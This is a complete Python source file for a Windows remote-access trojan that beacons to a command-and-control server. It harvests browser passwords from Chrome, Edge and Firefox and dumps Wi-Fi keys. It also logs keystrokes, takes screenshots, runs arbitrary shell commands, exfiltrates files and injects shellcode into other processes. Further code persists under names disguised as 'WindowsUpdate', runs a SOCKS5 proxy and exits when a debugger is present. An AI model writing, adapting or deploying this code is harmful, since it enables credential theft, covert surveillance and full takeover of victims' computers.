import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import os
import sys
import json
import base64
import sqlite3
import time
import platform
import subprocess
import random
import io
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import requests
import pyautogui
import win32crypt
import winreg
from datetime import datetime, timedelta
import shutil
import ctypes
import psutil
import socket
import threading
import select
from pynput import keyboard
import configparser
import xml.etree.ElementTree as ET
import socketio

# ======================
# Configuration
# ======================
class Config:
    def __init__(self):
        self.C2_SERVER = "https://192.168.16.78:443"
        self.AES_KEY = b"32bytekey-ultra-secure-123456789"
        self.AES_IV = b"16byteiv-9876543"
        self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.CHECKIN_INTERVAL = 10
        self.SOCKS5_PORT = 1080
        self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
        self.DEBUG = True

# ======================
# Encryption
# ======================
class Crypto:
    def __init__(self, key, iv):
        if len(key) not in {16, 24, 32}:
            raise ValueError(f"Invalid AES key length ({len(key)} bytes)")
        if len(iv) != 16:
            raise ValueError(f"Invalid AES IV length ({len(iv)} bytes)")
        self.key = key
        self.iv = iv

    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        padded_data = pad(json.dumps(data).encode(), AES.block_size)
        ct_bytes = cipher.encrypt(padded_data)
        return base64.b64encode(ct_bytes).decode()

    def decrypt(self, enc_data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        ct = base64.b64decode(enc_data)
        pt = cipher.decrypt(ct)
        return json.loads(unpad(pt, AES.block_size))

# ======================
# Credential Harvesting
# ======================
class CredentialHarvester:
    @staticmethod
    def get_chrome_credentials():
        try:
            credentials = []
            chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 
                                     'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
            
            if not os.path.exists(chrome_path):
                return credentials

            temp_db = os.path.join(os.getenv('TEMP'), 'chrome_temp.db')
            if os.path.exists(temp_db):
                os.remove(temp_db)
            
            shutil.copy2(chrome_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for url, user, encrypted_pw in cursor.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1]
                    if password:
                        credentials.append({
                            "browser": "chrome",
                            "url": url,
                            "username": user,
                            "password": password.decode('utf-8', errors='ignore')
                        })
                except:
                    continue
            
            conn.close()
            os.remove(temp_db)
            return credentials
        except Exception as e:
            return []

    @staticmethod
    def get_firefox_credentials():
        try:
            credentials = []
            profiles = []
            ff_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox')
            
            if os.path.exists(os.path.join(ff_path, 'profiles.ini')):
                config = configparser.ConfigParser()
                config.read(os.path.join(ff_path, 'profiles.ini'))
                
                for section in config.sections():
                    if section.startswith('Profile'):
                        profiles.append(os.path.join(ff_path, config[section]['Path']))
            
            for profile in profiles:
                logins_path = os.path.join(profile, 'logins.json')
                if os.path.exists(logins_path):
                    with open(logins_path, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                    
                    for login in data.get('logins', []):
                        try:
                            credentials.append({
                                "browser": "firefox",
                                "url": login['hostname'],
                                "username": login['encryptedUsername'],
                                "password": login['encryptedPassword']
                            })
                        except:
                            continue
            return credentials
        except:
            return []

    @staticmethod
    def get_edge_credentials():
        try:
            credentials = []
            edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 
                                    'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
            
            if not os.path.exists(edge_path):
                return credentials

            temp_db = os.path.join(os.getenv('TEMP'), 'edge_temp.db')
            if os.path.exists(temp_db):
                os.remove(temp_db)
            
            shutil.copy2(edge_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for url, user, encrypted_pw in cursor.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1]
                    if password:
                        credentials.append({
                            "browser": "edge",
                            "url": url,
                            "username": user,
                            "password": password.decode('utf-8', errors='ignore')
                        })
                except:
                    continue
            
            conn.close()
            os.remove(temp_db)
            return credentials
        except:
            return []

    @staticmethod
    def get_wifi_passwords():
        try:
            profiles = []
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore').split('\n')
            profiles = [line.split(":")[1].strip() for line in results if "All User Profile" in line]
            
            wifi_passwords = []
            for profile in profiles:
                try:
                    password_result = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                    ).decode('utf-8', errors='ignore').split('\n')
                    password = [line.split(":")[1].strip() for line in password_result if "Key Content" in line][0]
                    wifi_passwords.append({
                        "ssid": profile,
                        "password": password
                    })
                except:
                    continue
            
            return wifi_passwords
        except:
            return []

# ======================
# System Functions
# ======================
class SystemUtils:
    @staticmethod
    def take_screenshot():
        try:
            if platform.system() == 'Windows':
                os.environ['DISPLAY'] = ':0.0'
            
            screenshot = pyautogui.screenshot()
            buffered = io.BytesIO()
            screenshot.save(buffered, format="PNG")
            buffered.seek(0)
            return base64.b64encode(buffered.read()).decode('utf-8')
        except Exception as e:
            return None

    @staticmethod
    def get_system_info():
        try:
            info = {
                "hostname": platform.node(),
                "username": os.getlogin(),
                "os": platform.platform(),
                "architecture": platform.architecture()[0],
                "processor": platform.processor(),
                "ram": round(psutil.virtual_memory().total / (1024**3), 2),
                "privilege": "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user",
                "processes": []
            }

            for proc in sorted(psutil.process_iter(['pid', 'name', 'username', 'cpu_percent']), 
                             key=lambda p: p.info['cpu_percent'], reverse=True)[:10]:
                info["processes"].append({
                    "pid": proc.info['pid'],
                    "name": proc.info['name'],
                    "user": proc.info['username'],
                    "cpu": proc.info['cpu_percent']
                })

            return info
        except:
            return {}

    @staticmethod
    def execute_command(cmd):
        try:
            result = subprocess.run(cmd, shell=True, 
                                  capture_output=True, text=True, 
                                  timeout=30)
            return {
                "output": result.stdout,
                "error": result.stderr,
                "returncode": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {
                "error": "Command timed out after 30 seconds",
                "returncode": -1
            }
        except Exception as e:
            return {
                "error": str(e),
                "returncode": -1
            }

    @staticmethod
    def upload_file(filepath):
        try:
            if not os.path.exists(filepath):
                return {"error": "File not found"}
            
            if os.path.getsize(filepath) > Config.MAX_UPLOAD_SIZE:
                return {"error": "File too large"}
            
            with open(filepath, "rb") as f:
                file_data = f.read()
            
            return {
                "filename": os.path.basename(filepath),
                "data": base64.b64encode(file_data).decode('utf-8'),
                "size": len(file_data)
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def download_file(filename, data):
        try:
            file_data = base64.b64decode(data)
            downloads_dir = os.path.join(os.getenv('USERPROFILE'), 'Downloads')
            filepath = os.path.join(downloads_dir, filename)
            
            counter = 1
            while os.path.exists(filepath):
                name, ext = os.path.splitext(filename)
                filepath = os.path.join(downloads_dir, f"{name}_{counter}{ext}")
                counter += 1
            
            with open(filepath, "wb") as f:
                f.write(file_data)
            
            return {"status": "success", "path": filepath}
        except Exception as e:
            return {"error": str(e)}

# ======================
# Persistence
# ======================
class Persistence:
    @staticmethod
    def install():
        try:
            if platform.system() != "Windows":
                return {"status": "error", "message": "Only Windows supported"}
            
            # Registry persistence
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.HKEY_CURRENT_USER
            try:
                reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + " " + __file__)
                winreg.CloseKey(reg_key)
            except:
                return {"status": "error", "message": "Failed to set registry key"}
            
            # Scheduled task
            try:
                task_name = "WindowsUpdateTask"
                task_xml = f"""
                <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
                    <Triggers>
                        <LogonTrigger>
                            <Enabled>true</Enabled>
                        </LogonTrigger>
                        <CalendarTrigger>
                            <StartBoundary>{(datetime.now() + timedelta(minutes=1)).strftime('%Y-%m-%dT%H:%M:%S')}</StartBoundary>
                            <Enabled>true</Enabled>
                            <ScheduleByDay>
                                <DaysInterval>1</DaysInterval>
                            </ScheduleByDay>
                        </CalendarTrigger>
                    </Triggers>
                    <Principals>
                        <Principal id="Author">
                            <UserId>S-1-5-18</UserId>
                            <RunLevel>HighestAvailable</RunLevel>
                        </Principal>
                    </Principals>
                    <Settings>
                        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
                        <AllowHardTerminate>false</AllowHardTerminate>
                        <StartWhenAvailable>true</StartWhenAvailable>
                        <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
                        <IdleSettings>
                            <StopOnIdleEnd>false</StopOnIdleEnd>
                            <RestartOnIdle>false</RestartOnIdle>
                        </IdleSettings>
                        <AllowStartOnDemand>true</AllowStartOnDemand>
                        <Enabled>true</Enabled>
                        <Hidden>true</Hidden>
                        <RunOnlyIfIdle>false</RunOnlyIfIdle>
                        <WakeToRun>false</WakeToRun>
                        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                        <Priority>7</Priority>
                    </Settings>
                    <Actions Context="Author">
                        <Exec>
                            <Command>{sys.executable}</Command>
                            <Arguments>"{__file__}"</Arguments>
                        </Exec>
                    </Actions>
                </Task>
                """
                
                xml_path = os.path.join(os.getenv('TEMP'), 'task.xml')
                with open(xml_path, 'w') as f:
                    f.write(task_xml)
                
                subprocess.run(
                    ['schtasks', '/Create', '/TN', task_name, '/XML', xml_path, '/F'],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                os.remove(xml_path)
            except:
                return {"status": "error", "message": "Failed to create scheduled task"}
            
            return {"status": "success", "message": "Persistence installed"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

# ======================
# Process Injection
# ======================
class ProcessInjector:
    @staticmethod
    def inject_shellcode(pid, shellcode):
        try:
            PROCESS_ALL_ACCESS = 0x1F0FFF
            PAGE_EXECUTE_READWRITE = 0x40
            kernel32 = ctypes.windll.kernel32
            
            process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not process:
                return {"status": "error", "message": f"OpenProcess failed: {kernel32.GetLastError()}"}
            
            shellcode_size = len(shellcode)
            memory = kernel32.VirtualAllocEx(
                process, 
                None, 
                shellcode_size, 
                0x3000,
                PAGE_EXECUTE_READWRITE
            )
            if not memory:
                return {"status": "error", "message": f"VirtualAllocEx failed: {kernel32.GetLastError()}"}
            
            written = ctypes.c_ulong(0)
            kernel32.WriteProcessMemory(
                process, 
                memory, 
                shellcode, 
                shellcode_size, 
                ctypes.byref(written))
            
            thread_id = ctypes.c_ulong(0)
            kernel32.CreateRemoteThread(
                process, 
                None, 
                0, 
                memory, 
                None, 
                0, 
                ctypes.byref(thread_id))
            
            return {
                "status": "success", 
                "message": f"Injected into PID {pid}, Thread ID {thread_id.value}"
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

# ======================
# SOCKS5 Proxy
# ======================
class SOCKS5Proxy:
    def __init__(self, port):
        self.port = port
        self.running = False
        self.server_socket = None
        self.connections = {}

    def start(self):
        if self.running:
            return {"status": "error", "message": "Proxy already running"}
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('127.0.0.1', self.port))
            self.server_socket.listen(5)
            self.running = True
            
            threading.Thread(target=self._accept_connections, daemon=True).start()
            return {"status": "success", "message": f"SOCKS5 proxy started on port {self.port}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def stop(self):
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        return {"status": "success", "message": "SOCKS5 proxy stopped"}

    def _accept_connections(self):
        while self.running:
            try:
                conn, addr = self.server_socket.accept()
                threading.Thread(
                    target=self._handle_client,
                    args=(conn, addr),
                    daemon=True
                ).start()
            except:
                break

    def _handle_client(self, conn, addr):
        try:
            conn.recv(256)
            conn.sendall(b"\x05\x00")
            
            request = conn.recv(4)
            if request[0] != 0x05 or request[1] != 0x01:
                conn.close()
                return
            
            addr_type = request[3]
            if addr_type == 0x01:
                target_host = socket.inet_ntoa(conn.recv(4))
            elif addr_type == 0x03:
                length = ord(conn.recv(1))
                target_host = conn.recv(length).decode()
            else:
                conn.close()
                return
            
            target_port = int.from_bytes(conn.recv(2), 'big')
            
            target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_sock.connect((target_host, target_port))
            
            conn.sendall(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + (self.port).to_bytes(2, 'big'))
            
            self._relay_data(conn, target_sock)
        except Exception as e:
            pass
        finally:
            conn.close()

    def _relay_data(self, client_sock, target_sock):
        sockets = [client_sock, target_sock]
        while self.running:
            try:
                read_sockets, _, _ = select.select(sockets, [], [], 1)
                for sock in read_sockets:
                    data = sock.recv(4096)
                    if not data:
                        return
                    
                    if sock == client_sock:
                        target_sock.sendall(data)
                    else:
                        client_sock.sendall(data)
            except:
                break

# ======================
# Keylogger
# ======================
class Keylogger:
    def __init__(self):
        self.log = ""
        self.listener = None
        self.running = False

    def start(self):
        if self.running:
            return {"status": "error", "message": "Keylogger already running"}
        
        self.running = True
        self.listener = keyboard.Listener(on_press=self._on_key_press)
        self.listener.start()
        return {"status": "success", "message": "Keylogger started"}

    def stop(self):
        if not self.running:
            return {"status": "error", "message": "Keylogger not running"}
        
        self.running = False
        if self.listener:
            self.listener.stop()
        return {"status": "success", "message": "Keylogger stopped"}

    def get_logs(self):
        logs = self.log
        self.log = ""
        return logs

    def _on_key_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == key.space:
                self.log += " "
            elif key == key.enter:
                self.log += "\n"
            else:
                self.log += f"[{key}]"

# ======================
# WebSocket Client
# ======================
class WebSocketClient:
    def __init__(self, agent_id, crypto, server_url):
        self.agent_id = agent_id
        self.crypto = crypto
        self.server_url = server_url.replace('https://', 'wss://').replace('http://', 'ws://') + '/terminal'
        self.socket = None
        self.running = False
        self.current_dir = os.getcwd()

    def connect(self):
        try:
            self.socket = socketio.Client(ssl_verify=False)
            
            @self.socket.on('command')
            def handle_command(data):
                try:
                    result = self._execute_command(data['command'])
                    self.socket.emit('command_result', {
                        'agent_id': self.agent_id,
                        'command': data['command'],
                        'output': result.get('output', ''),
                        'error': result.get('error', ''),
                        'current_dir': result.get('current_dir', ''),
                        'status': result.get('status', 'error')
                    })
                except Exception as e:
                    self.socket.emit('command_error', {
                        'agent_id': self.agent_id,
                        'error': str(e)
                    })

            @self.socket.on('disconnect')
            def handle_disconnect():
                self.running = False

            self.socket.connect(self.server_url)
            self.socket.emit('agent_connect', {
                'agent_id': self.agent_id,
                'auth_token': self.crypto.encrypt({'agent_id': self.agent_id})
            })
            
            self.running = True
            return True
        except Exception as e:
            if Config.DEBUG:
                print(f"[!] WebSocket connection error: {str(e)}")
            return False

    def _execute_command(self, command):
        try:
            if command.lower().startswith('cd '):
                new_dir = command[3:].strip()
                try:
                    if new_dir:
                        os.chdir(new_dir)
                    self.current_dir = os.getcwd()
                    return {
                        'status': 'success',
                        'output': f"Current directory is now: {self.current_dir}",
                        'current_dir': self.current_dir
                    }
                except Exception as e:
                    return {
                        'status': 'error',
                        'error': str(e),
                        'current_dir': self.current_dir
                    }

            result = subprocess.run(
                command,
                shell=True,
                cwd=self.current_dir,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=30
            )

            self.current_dir = os.getcwd()
            return {
                'status': 'success',
                'output': result.stdout,
                'error': result.stderr,
                'current_dir': self.current_dir
            }
        except subprocess.TimeoutExpired:
            return {
                'status': 'error',
                'error': 'Command timed out after 30 seconds',
                'current_dir': self.current_dir
            }
        except Exception as e:
            return {
                'status': 'error',
                'error': str(e),
                'current_dir': self.current_dir
            }

    def disconnect(self):
        if self.socket:
            self.socket.disconnect()
        self.running = False

# ======================
# Main Agent Class
# ======================
class Agent:
    def __init__(self):
        self.config = Config()
        self.crypto = Crypto(self.config.AES_KEY, self.config.AES_IV)
        self.agent_id = self._generate_agent_id()
        self.socks_proxy = SOCKS5Proxy(self.config.SOCKS5_PORT)
        self.keylogger = Keylogger()
        self.ws_client = None
        self.last_checkin = 0
        self.jitter = 0.3
        self._initial_checkin = None
        self._checkin_count = 0
        self._running = True

    def _generate_agent_id(self):
        return f"{platform.node()}-{os.getlogin()}-{hash(os.getcwd())}"

    def _get_checkin_data(self):
        data = {
            "agent_id": self.agent_id,
            "hostname": platform.node(),
            "username": os.getlogin(),
            "os": platform.platform(),
            "privilege": "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user",
            "ip": requests.get('https://api.ipify.org', timeout=5).text,
            "timestamp": datetime.now().isoformat()
        }

        if not self._initial_checkin or (time.time() - self._initial_checkin) > 86400:
            data["credentials"] = {
                "browsers": CredentialHarvester.get_chrome_credentials() + 
                           CredentialHarvester.get_firefox_credentials() + 
                           CredentialHarvester.get_edge_credentials(),
                "wifi": CredentialHarvester.get_wifi_passwords()
            }
            if not self._initial_checkin:
                self._initial_checkin = time.time()

        if self._checkin_count % 10 == 0:
            screenshot = SystemUtils.take_screenshot()
            if screenshot:
                data["screenshot"] = screenshot

        self._checkin_count += 1
        return data

    def _execute_task(self, task):
        try:
            task_type = task.get("type")
            
            if task_type == "terminal":
                command = task.get("cmd", "")
                if not command:
                    task_data = task.get("data", {})
                    command = task_data.get("cmd", "")
                
                current_dir = os.getcwd()
                
                if command.lower().startswith("cd "):
                    new_dir = command[3:].strip()
                    try:
                        if new_dir:
                            if new_dir == "..":
                                os.chdir("..")
                            elif new_dir == ".":
                                pass
                            elif new_dir == "\\":
                                os.chdir("\\")
                            elif new_dir.startswith("\\"):
                                os.chdir(new_dir)
                            else:
                                os.chdir(os.path.join(current_dir, new_dir))
                        
                        current_dir = os.getcwd()
                        current_dir = os.path.normpath(current_dir)
                        
                        return {
                            "status": "success",
                            "output": f"Current directory is now: {current_dir}",
                            "error": "",
                            "terminal": True,
                            "task_id": task.get("task_id"),
                            "current_dir": current_dir,
                            "command": command
                        }
                    except Exception as e:
                        return {
                            "status": "error",
                            "output": "",
                            "error": str(e),
                            "terminal": True,
                            "task_id": task.get("task_id"),
                            "current_dir": current_dir,
                            "command": command
                        }
                
                if command.strip().lower() == "dir":
                    try:
                        dir_output = []
                        total_files = 0
                        total_size = 0
                        dir_count = 0
                        
                        for item in os.listdir(current_dir):
                            full_path = os.path.join(current_dir, item)
                            try:
                                stat = os.stat(full_path)
                                mtime = datetime.fromtimestamp(stat.st_mtime)
                                date_str = mtime.strftime("%d.%m.%Y %H:%M")
                                
                                if os.path.isdir(full_path):
                                    size_str = "<DIR>"
                                    dir_count += 1
                                else:
                                    size_str = "{:>15,}".format(stat.st_size).replace(",", " ")
                                    total_files += 1
                                    total_size += stat.st_size
                                
                                dir_output.append(f"{date_str}  {size_str} {item}")
                            except:
                                continue
                        
                        dir_output.append("")
                        dir_output.append(f"              {total_files} File(s) {total_size:,} bytes".replace(",", " "))
                        dir_output.append(f"              {dir_count} Dir(s)")
                        
                        return {
                            "status": "success",
                            "output": "\n".join(dir_output),
                            "error": "",
                            "terminal": True,
                            "task_id": task.get("task_id"),
                            "current_dir": current_dir,
                            "command": command
                        }
                    except Exception as e:
                        return {
                            "status": "error",
                            "output": "",
                            "error": str(e),
                            "terminal": True,
                            "task_id": task.get("task_id"),
                            "current_dir": current_dir,
                            "command": command
                        }
                
                result = subprocess.run(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='utf-8',
                    errors='replace',
                    timeout=30,
                    cwd=current_dir
                )
                
                output = result.stdout.strip()
                error = result.stderr.strip()
                current_dir = os.getcwd()
                
                if task.get("terminal", False) or task.get("data", {}).get("terminal", False):
                    return {
                        "status": "success",
                        "output": output if output else "Command executed successfully",
                        "error": error,
                        "terminal": True,
                        "task_id": task.get("task_id"),
                        "current_dir": current_dir,
                        "command": command
                    }
                
                return {
                    "output": output,
                    "error": error,
                    "returncode": result.returncode,
                    "current_dir": current_dir,
                    "command": command
                }
            
            elif task_type == "screenshot":
                screenshot = SystemUtils.take_screenshot()
                if screenshot:
                    return {
                        "status": "success",
                        "screenshot": screenshot,
                        "content_type": "image/png"
                    }
                return {"status": "error", "message": "Failed to capture screenshot"}
            
            elif task_type == "harvest_creds":
                return {
                    "browsers": CredentialHarvester.get_chrome_credentials() + 
                                CredentialHarvester.get_firefox_credentials() + 
                                CredentialHarvester.get_edge_credentials(),
                    "wifi": CredentialHarvester.get_wifi_passwords()
                }
            
            elif task_type == "upload":
                return SystemUtils.upload_file(task.get("path", ""))
            
            elif task_type == "download":
                return SystemUtils.download_file(
                    task.get("filename", ""), 
                    task.get("data", ""))
            
            elif task_type == "persist":
                return Persistence.install()
            
            elif task_type == "inject":
                return ProcessInjector.inject_shellcode(
                    task.get("pid", 0),
                    base64.b64decode(task.get("shellcode", "")))
            
            elif task_type == "socks5":
                if task.get("action") == "start":
                    return self.socks_proxy.start()
                else:
                    return self.socks_proxy.stop()
            
            elif task_type == "keylogger":
                if task.get("action") == "start":
                    return self.keylogger.start()
                else:
                    result = self.keylogger.get_logs()
                    self.keylogger.stop()
                    return {"logs": result}
            
            elif task_type == "websocket":
                action = task.get("action")
                if action == "start":
                    if not self.ws_client or not self.ws_client.running:
                        self.ws_client = WebSocketClient(
                            self.agent_id,
                            self.crypto,
                            self.config.C2_SERVER
                        )
                        connected = self.ws_client.connect()
                        if connected:
                            return {"status": "success", "message": "WebSocket connected"}
                        else:
                            return {"status": "error", "message": "WebSocket connection failed"}
                else:
                    if self.ws_client and self.ws_client.running:
                        self.ws_client.disconnect()
                        return {"status": "success", "message": "WebSocket disconnected"}
                    else:
                        return {"status": "error", "message": "No active WebSocket connection"}
            
            else:
                return {"status": "error", "message": "Unknown task type"}
        
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def beacon(self):
        print("[*] Starting beacon loop...")
        while self._running:
            try:
                sleep_time = self.config.CHECKIN_INTERVAL * (1 + (random.random() * self.jitter * 2 - self.jitter))
                time.sleep(sleep_time)
                
                checkin_data = self._get_checkin_data()
                encrypted_data = self.crypto.encrypt(checkin_data)
                
                response = requests.post(
                    f"{self.config.C2_SERVER}/api/checkin",
                    data=encrypted_data,
                    headers={
                        "User-Agent": self.config.USER_AGENT,
                        "Content-Type": "application/octet-stream"
                    },
                    timeout=30,
                    verify=False
                )
                
                if response.status_code == 200:
                    task = self.crypto.decrypt(response.content)
                    
                    if task.get("type") != "noop":
                        result = self._execute_task(task)
                        
                        requests.post(
                            f"{self.config.C2_SERVER}/api/task_result",
                            data=self.crypto.encrypt({
                                "task_id": task.get("task_id"),
                                "agent_id": self.agent_id,
                                "task_type": task.get("type"),
                                "result": result
                            }),
                            headers={
                                "User-Agent": self.config.USER_AGENT,
                                "Content-Type": "application/octet-stream"
                            },
                            timeout=30,
                            verify=False
                        )
                
            except requests.exceptions.RequestException as e:
                print(f"[!] Connection error: {str(e)}")
                time.sleep(self.config.CHECKIN_INTERVAL * 2)
            except Exception as e:
                print(f"[!] Unexpected error: {str(e)}")
                time.sleep(self.config.CHECKIN_INTERVAL)

    def stop(self):
        self._running = False
        self.socks_proxy.stop()
        self.keylogger.stop()
        if self.ws_client:
            self.ws_client.disconnect()

    def run(self):
        print("[*] Starting agent...")
        self.beacon()

if __name__ == "__main__":
    def is_debugging():
        try:
            if platform.system() == "Windows":
                kernel32 = ctypes.windll.kernel32
                if kernel32.IsDebuggerPresent() != 0:
                    print("[!] Debugger detected - exiting")
                    return True
            return False
        except:
            return False
    
    if is_debugging():
        sys.exit(0)
    
    try:
        print("[*] Starting agent...")
        agent = Agent()
        agent.run()
    except Exception as e:
        print(f"[!] Agent crashed: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)